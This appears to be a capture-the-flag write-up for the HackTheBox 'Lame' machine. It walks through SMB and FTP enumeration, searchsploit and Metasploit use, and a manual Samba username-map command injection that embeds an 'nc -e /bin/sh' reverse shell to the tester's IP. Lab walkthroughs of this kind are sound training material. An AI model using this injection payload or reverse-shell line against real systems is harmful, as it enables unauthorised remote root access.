Lame – HackTheBox OSCP Style Vulnerable Machine

Overview

Lame is a relatively easy box hosted on HackTheBox that is exploitable in several different ways. This guide will cover Nmap, SMB File shares, FTP anonymous logins, Searchsploit, Metasploit.

User Flag

Start off with an nmap scan. We can see FTP with anon login, an SSH server, and an SMB file share running.


The first thing that shows up is the anonymous login for the FTP server. If you connect, however, you only get to an empty directory, so you need to move on.

Since there is an SMB fileshare running, we can start off by enumerating the share with smbmap. Additionally, here is a quick guide to smb enumeration if you

smbmap -H 10.129.213.17
tmp                                          READ, WRITE	oh noes!
We can see there is a clue here as we have read/write access to a file. We can try and establish a connection to the /tmp share with smbclient.

There is a disconnect between older smb servers and modern smbclient, so if you get an error, edit the smb.conf file to include client min protocol=NT1 under the [global] header. Then connect with:

smbclient -N //10.10.15.75/tmp --option='client min protocol=NT1'
Using the results from the nmap scan, we can plug in the versions of the FTP and SSH services into searchsploit to find any known vulnerabilities.

└─$ searchsploit vsftpd 2.3.4
-------------------------------- ---------------------------------
 Exploit Title                  |  Path
-------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command | unix/remote/49757.py
-------------------------------- ---------------------------------
Shellcodes: No Results
As there is a ruby script available, chances are there is a msfconsole module.

After launching msfconsole we can search for the exploit.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search vsftpd

Matching Modules
================

   #  Name          Disclosure Date  Rank       Check  Description
   -  ----          ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
Ultimately this exploit will fail, as there is a patch available and the box has implemented a line of defense here.


With that, we move on to the next possible vulnerable service, SMB.

└─$ searchsploit samba 3.0.20
------------------------------------- ---------------------------------
 Exploit Title                       |  Path

Samba 3.0.20 < 3.0.25rc3 - 'Username | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflo | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflo | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Serv | linux_x86/dos/36741.py
------------------------------------- ---------------------------------
Shellcodes: No Results
We can see another ruby script, so we search for it in Metasploit and run the exploit.


Make sure to set the RHOSTS to the target machine and the LHOST to your designated IP over HTB. Usually, this will be tun0 for shorthand assuming you only have one VPN up at the time.

This exploit actually gives us root, so we can simply run the find command to find both flags.

find / -type f -name "user.txt" 2</dev/null [user flag]
Root Flag

find / -type f -name "root.txt" 2</dev/null [root flag]
Without Metasploit

As this is an OSCP box, I wanted to include a manual exploitation section.

Since we can log into the shared drive over smb, we can attempt to change our user using the logon command.

smb: \> logon "./=`nohup nc -e /bin/sh 10.10.15.75 31337`"
For this to work, we need to set up a netcat listener to listen for the incoming connection.


There we are, another root without the use of Metasploit!
